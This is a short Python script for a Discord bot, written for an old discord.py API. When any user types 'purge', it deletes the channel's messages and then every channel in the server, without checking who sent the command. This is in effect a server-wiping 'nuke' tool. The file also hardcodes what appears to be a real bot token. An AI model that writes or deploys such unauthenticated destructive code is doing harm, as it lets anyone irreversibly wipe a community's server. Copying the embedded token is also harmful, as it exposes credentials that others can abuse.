import discord
import asyncio

purge_warning = "Warning, purging server."
purge_success = "The purge has been successful. Enjoy your server."



client = discord.Client()
@client.event
async def on_ready():
    print('Connected!')
    print('Username: ' + client.user.name)
    print('ID: ' + client.user.id)


@client.event
async def on_message(message):
    if message.content.startswith('purge'):
        #Purge messages from general
        print(purge_warning)
        await client.send_message(message.channel, purge_warning)
        await asyncio.sleep(1)
        deleted = await client.purge_from(message.channel)
        await asyncio.sleep(1)
        #Delete all channels.
        server = message.server
        channelList = server.channels
        for i in channelList:
             await client.delete_channel(i)
        #Delete all roles.
        await client.send_message(message.channel, purge_success)
       
client.run('MzU1OTgxMzUzNDUzNjE3MTUy.DJU7Kw.G595TciWLwbQRgGd25S5MXBoAPA')
